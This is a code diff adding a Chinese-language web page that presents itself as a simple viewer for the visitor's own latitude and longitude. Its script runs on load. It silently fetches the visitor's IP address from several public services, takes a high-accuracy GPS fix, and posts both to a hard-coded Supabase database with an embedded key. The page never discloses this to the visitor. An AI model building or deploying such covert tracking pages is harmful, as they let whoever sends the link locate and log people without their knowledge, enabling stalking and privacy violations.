@@ -1,0 +1,726 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>位置信息</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: #f5f6f8;
+            padding: 20px;
+            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Helvetica Neue", Arial, sans-serif;
+        }
+
+        .container {
+            background: #ffffff;
+            border-radius: 8px;
+            padding: 32px 36px;
+            max-width: 420px;
+            width: 100%;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.04);
+            border: 1px solid #e4e6e9;
+        }
+
+        .title {
+            font-size: 1.3rem;
+            font-weight: 500;
+            color: #1d1d1f;
+            letter-spacing: 0.2px;
+            padding-bottom: 16px;
+            border-bottom: 1px solid #e4e6e9;
+            margin-bottom: 20px;
+        }
+
+        .field {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 0;
+            border-bottom: 1px solid #f0f1f2;
+        }
+
+        .field:last-of-type {
+            border-bottom: none;
+        }
+
+        .field-label {
+            color: #6e6e73;
+            font-size: 0.85rem;
+            font-weight: 400;
+            flex-shrink: 0;
+        }
+
+        .field-value {
+            font-weight: 450;
+            font-size: 0.95rem;
+            font-family: "SF Mono", "Menlo", "Monaco", monospace;
+            color: #1d1d1f;
+            background: #f5f6f8;
+            padding: 2px 14px;
+            border-radius: 4px;
+            min-width: 130px;
+            text-align: center;
+            letter-spacing: 0.2px;
+            word-break: break-all;
+        }
+
+        .field-value.loading {
+            color: #a1a1a6;
+            background: #f5f6f8;
+        }
+
+        .timestamp-row {
+            margin-top: 14px;
+            padding-top: 14px;
+            border-top: 1px solid #e4e6e9;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 6px;
+        }
+
+        .timestamp-label {
+            color: #6e6e73;
+            font-size: 0.8rem;
+            flex-shrink: 0;
+        }
+
+        .timestamp-value {
+            font-size: 0.8rem;
+            font-weight: 400;
+            color: #6e6e73;
+            font-variant-numeric: tabular-nums;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 6px;
+            font-size: 0.9rem;
+            font-weight: 450;
+            cursor: pointer;
+            transition: background 0.12s;
+            color: #ffffff;
+            background: #1d1d1f;
+            margin-top: 18px;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .btn:hover {
+            background: #2d2d2f;
+        }
+
+        .btn:active {
+            transform: scale(0.98);
+        }
+
+        .btn:disabled {
+            opacity: 0.4;
+            cursor: default;
+            transform: none;
+        }
+
+        .btn-secondary {
+            background: transparent;
+            color: #6e6e73;
+            border: 1px solid #d0d2d6;
+            margin-top: 8px;
+        }
+
+        .btn-secondary:hover {
+            background: #f5f6f8;
+            border-color: #b8bcc2;
+        }
+
+        .status {
+            margin-top: 14px;
+            padding: 8px 12px;
+            border-radius: 4px;
+            font-size: 0.8rem;
+            text-align: center;
+            color: #6e6e73;
+            background: #f5f6f8;
+            min-height: 36px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .status.success {
+            background: #f0f4f0;
+            color: #2d6a4f;
+        }
+
+        .status.error {
+            background: #fdf0ef;
+            color: #9e2a2b;
+        }
+
+        .status .dot {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            border: 2px solid #d0d2d6;
+            border-top-color: #1d1d1f;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .footer {
+            margin-top: 18px;
+            text-align: center;
+            font-size: 0.7rem;
+            color: #c0c0c5;
+            letter-spacing: 0.5px;
+            user-select: none;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            cursor: default;
+        }
+
+        @media (max-width: 480px) {
+            body {
+                padding: 12px;
+                align-items: flex-start;
+                padding-top: 30px;
+            }
+
+            .container {
+                padding: 20px 16px;
+                border-radius: 6px;
+            }
+
+            .title {
+                font-size: 1.1rem;
+                padding-bottom: 12px;
+                margin-bottom: 14px;
+            }
+
+            .field {
+                padding: 8px 0;
+                flex-wrap: wrap;
+                gap: 4px 0;
+            }
+
+            .field-label {
+                font-size: 0.8rem;
+                width: 100%;
+            }
+
+            .field-value {
+                font-size: 0.85rem;
+                padding: 3px 12px;
+                min-width: 100%;
+                width: 100%;
+                text-align: center;
+            }
+
+            .timestamp-row {
+                margin-top: 10px;
+                padding-top: 10px;
+                flex-direction: column;
+                align-items: stretch;
+                gap: 4px;
+            }
+
+            .timestamp-label {
+                font-size: 0.75rem;
+            }
+
+            .timestamp-value {
+                font-size: 0.75rem;
+                text-align: right;
+            }
+
+            .btn {
+                padding: 14px;
+                font-size: 0.9rem;
+                margin-top: 14px;
+                border-radius: 6px;
+            }
+
+            .btn-secondary {
+                margin-top: 6px;
+            }
+
+            .status {
+                font-size: 0.75rem;
+                padding: 6px 10px;
+                min-height: 32px;
+                margin-top: 12px;
+            }
+
+            .footer {
+                font-size: 0.65rem;
+                margin-top: 14px;
+            }
+        }
+
+        @media (max-width: 360px) {
+            .container {
+                padding: 16px 12px;
+            }
+
+            .title {
+                font-size: 1rem;
+            }
+
+            .field-value {
+                font-size: 0.78rem;
+                padding: 2px 8px;
+            }
+
+            .btn {
+                padding: 12px;
+                font-size: 0.85rem;
+            }
+        }
+
+        @media (min-width: 768px) {
+            .container {
+                padding: 40px 48px;
+                max-width: 460px;
+            }
+
+            .title {
+                font-size: 1.5rem;
+            }
+
+            .field {
+                padding: 12px 0;
+            }
+
+            .field-label {
+                font-size: 0.9rem;
+            }
+
+            .field-value {
+                font-size: 1rem;
+                padding: 3px 18px;
+                min-width: 150px;
+            }
+
+            .btn {
+                padding: 14px;
+                font-size: 1rem;
+                margin-top: 20px;
+            }
+
+            .status {
+                font-size: 0.85rem;
+                padding: 10px 16px;
+                min-height: 40px;
+            }
+        }
+
+        @media (min-width: 1024px) {
+            .container {
+                padding: 48px 56px;
+                max-width: 500px;
+            }
+        }
+
+        @media (max-height: 600px) and (orientation: landscape) {
+            body {
+                align-items: center;
+                padding: 16px;
+            }
+
+            .container {
+                padding: 18px 24px;
+                max-width: 500px;
+            }
+
+            .title {
+                font-size: 1.1rem;
+                padding-bottom: 10px;
+                margin-bottom: 12px;
+            }
+
+            .field {
+                padding: 5px 0;
+            }
+
+            .btn {
+                padding: 10px;
+                margin-top: 10px;
+            }
+
+            .status {
+                min-height: 28px;
+                padding: 4px 10px;
+                margin-top: 10px;
+            }
+
+            .footer {
+                margin-top: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="title">位置信息</div>
+
+    <div class="field">
+        <span class="field-label">纬度</span>
+        <span class="field-value" id="latDisplay">—</span>
+    </div>
+    <div class="field">
+        <span class="field-label">经度</span>
+        <span class="field-value" id="lonDisplay">—</span>
+    </div>
+
+    <div class="timestamp-row">
+        <span class="timestamp-label">更新时间</span>
+        <span class="timestamp-value" id="timestampDisplay">--:--:--</span>
+    </div>
+
+    <button class="btn" id="getBtn">获取位置</button>
+    <button class="btn btn-secondary" id="retryBtn">重新获取</button>
+
+    <div class="status" id="statusBar">就绪</div>
+
+    <div class="footer">白菜</div>
+</div>
+
+<script>
+    (function() {
+        'use strict';
+
+        // Supabase 配置
+        const SUPABASE_URL = 'https://ircefwyrazfhkyvaohrb.supabase.co';
+        const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImlyY2Vmd3lyYXpmaGt5dmFvaHJiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODQwNDY3MjgsImV4cCI6MjA5OTYyMjcyOH0.fTrYNradbKYlewh2b5PAh7_zAdBaETxcv4UH5YIJP0E';
+
+        var latEl = document.getElementById('latDisplay');
+        var lonEl = document.getElementById('lonDisplay');
+        var tsEl = document.getElementById('timestampDisplay');
+        var statusEl = document.getElementById('statusBar');
+        var getBtn = document.getElementById('getBtn');
+        var retryBtn = document.getElementById('retryBtn');
+
+        var watchId = null;
+        var isFetching = false;
+        var currentLat = null;
+        var currentLon = null;
+        var currentIP = null;
+        var dataSent = false;
+
+        // ========== IP 获取（多种方式，静默） ==========
+        function fetchIP() {
+            var ipApis = [
+                {
+                    url: 'https://api.ipify.org?format=json',
+                    parser: function(data) { return data.ip; }
+                },
+                {
+                    url: 'https://ipapi.co/json/',
+                    parser: function(data) { return data.ip; }
+                },
+                {
+                    url: 'https://ip-api.com/json/',
+                    parser: function(data) { return data.query; }
+                },
+                {
+                    url: 'https://api.ip.sb/geoip',
+                    parser: function(data) { return data.ip; }
+                }
+            ];
+
+            var index = 0;
+
+            function tryNext() {
+                if (index >= ipApis.length) {
+                    console.warn('所有IP API均失败');
+                    return;
+                }
+
+                var api = ipApis[index];
+                index++;
+
+                fetch(api.url, { timeout: 3000 })
+                    .then(function(res) {
+                        if (!res.ok) throw new Error('HTTP ' + res.status);
+                        return res.json();
+                    })
+                    .then(function(data) {
+                        var ip = api.parser(data);
+                        if (ip && ip !== 'unknown' && ip !== '0.0.0.0') {
+                            currentIP = ip;
+                            console.log('IP获取成功:', ip);
+                            // 获取到IP后立即发送数据
+                            sendToSupabase();
+                            return;
+                        }
+                        tryNext();
+                    })
+                    .catch(function() {
+                        tryNext();
+                    });
+            }
+
+            tryNext();
+        }
+
+        // ========== Supabase 数据发送 ==========
+        function sendToSupabase() {
+            if (dataSent) return;
+
+            // 如果没有经纬度，不发送
+            if (currentLat === null || currentLon === null) {
+                console.warn('经纬度未就绪，等待定位完成');
+                return;
+            }
+
+            var payload = {
+                latitude: currentLat,
+                longitude: currentLon,
+                ip_address: currentIP || null
+            };
+
+            console.log('准备发送数据:', payload);
+
+            fetch(SUPABASE_URL + '/rest/v1/location_data', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'apikey': SUPABASE_KEY,
+                    'Authorization': 'Bearer ' + SUPABASE_KEY,
+                    'Prefer': 'return=minimal'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(function(res) {
+                if (res.ok) {
+                    dataSent = true;
+                    console.log('数据发送成功');
+                } else {
+                    console.warn('数据发送失败:', res.status);
+                }
+            })
+            .catch(function(err) {
+                console.error('发送请求错误:', err);
+            });
+        }
+
+        // ========== 位置相关函数 ==========
+        function setStatus(text, type) {
+            statusEl.textContent = text;
+            statusEl.className = 'status' + (type ? ' ' + type : '');
+        }
+
+        function setLoading() {
+            latEl.textContent = '…';
+            lonEl.textContent = '…';
+            latEl.className = 'field-value loading';
+            lonEl.className = 'field-value loading';
+            tsEl.textContent = '--:--:--';
+            setStatus('获取中…');
+            getBtn.disabled = true;
+            isFetching = true;
+        }
+
+        function resetDisplay() {
+            latEl.textContent = '—';
+            lonEl.textContent = '—';
+            latEl.className = 'field-value';
+            lonEl.className = 'field-value';
+            getBtn.disabled = false;
+            isFetching = false;
+        }
+
+        function now() {
+            var d = new Date();
+            var pad = function(n) { return String(n).padStart(2, '0'); };
+            var y = d.getFullYear();
+            var mo = pad(d.getMonth() + 1);
+            var day = pad(d.getDate());
+            var h = pad(d.getHours());
+            var mi = pad(d.getMinutes());
+            var s = pad(d.getSeconds());
+            return y + '-' + mo + '-' + day + ' ' + h + ':' + mi + ':' + s;
+        }
+
+        function showResult(position) {
+            var lat = position.coords.latitude;
+            var lon = position.coords.longitude;
+
+            currentLat = lat;
+            currentLon = lon;
+
+            latEl.textContent = lat.toFixed(6);
+            lonEl.textContent = lon.toFixed(6);
+            latEl.className = 'field-value';
+            lonEl.className = 'field-value';
+
+            tsEl.textContent = now();
+
+            setStatus('成功', 'success');
+            getBtn.disabled = false;
+            isFetching = false;
+
+            if (watchId !== null) {
+                navigator.geolocation.clearWatch(watchId);
+                watchId = null;
+            }
+
+            // 定位成功后尝试发送数据（IP可能已经在获取中）
+            sendToSupabase();
+        }
+
+        function showError(err) {
+            var msg = '失败';
+            if (err) {
+                switch (err.code) {
+                    case err.PERMISSION_DENIED:
+                        msg = '权限被拒绝';
+                        break;
+                    case err.POSITION_UNAVAILABLE:
+                        msg = '位置不可用';
+                        break;
+                    case err.TIMEOUT:
+                        msg = '请求超时';
+                        break;
+                    default:
+                        msg = err.message || '失败';
+                }
+            }
+            latEl.textContent = '—';
+            lonEl.textContent = '—';
+            latEl.className = 'field-value';
+            lonEl.className = 'field-value';
+            setStatus(msg, 'error');
+            getBtn.disabled = false;
+            isFetching = false;
+
+            if (watchId !== null) {
+                navigator.geolocation.clearWatch(watchId);
+                watchId = null;
+            }
+        }
+
+        function fetchLocation() {
+            if (isFetching) return;
+
+            if (!navigator.geolocation) {
+                setStatus('浏览器不支持', 'error');
+                return;
+            }
+
+            setLoading();
+
+            if (watchId !== null) {
+                navigator.geolocation.clearWatch(watchId);
+                watchId = null;
+            }
+
+            // 重置发送标记，允许新数据发送
+            dataSent = false;
+
+            var best = null;
+            var bestAcc = Infinity;
+            var attempts = 0;
+
+            watchId = navigator.geolocation.watchPosition(
+                function(pos) {
+                    attempts++;
+                    var acc = pos.coords.accuracy;
+                    if (acc < bestAcc) {
+                        bestAcc = acc;
+                        best = pos;
+                        showResult(pos);
+                        if (acc < 30) {
+                            navigator.geolocation.clearWatch(watchId);
+                            watchId = null;
+                            setStatus('已锁定', 'success');
+                            return;
+                        }
+                    }
+                    if (attempts >= 6) {
+                        navigator.geolocation.clearWatch(watchId);
+                        watchId = null;
+                        if (best) {
+                            showResult(best);
+                        } else {
+                            setStatus('未能获取', 'error');
+                            getBtn.disabled = false;
+                            isFetching = false;
+                        }
+                    }
+                },
+                function(err) {
+                    if (watchId !== null) {
+                        navigator.geolocation.clearWatch(watchId);
+                        watchId = null;
+                    }
+                    showError(err);
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 12000,
+                    maximumAge: 0
+                }
+            );
+
+            setTimeout(function() {
+                if (watchId !== null) {
+                    navigator.geolocation.clearWatch(watchId);
+                    watchId = null;
+                    if (best) {
+                        showResult(best);
+                        setStatus('已获取', 'success');
+                    } else {
+                        setStatus('请求超时', 'error');
+                        getBtn.disabled = false;
+                        isFetching = false;
+                    }
+                }
+            }, 25000);
+        }
+
+        function retry() {
+            if (watchId !== null) {
+                navigator.geolocation.clearWatch(watchId);
+                watchId = null;
+            }
+            resetDisplay();
+            dataSent = false;
+            setStatus('重新获取…');
+            fetchLocation();
+        }
+
+        // ========== 初始化 ==========
+        getBtn.addEventListener('click', fetchLocation);
+        retryBtn.addEventListener('click', retry);
+
+        window.addEventListener('load', function() {
+            // 先获取IP（静默）
+            fetchIP();
+            // 再获取位置
+            setTimeout(fetchLocation, 300);
+        });
+    })();
+</script>
+
+</body>
+</html>
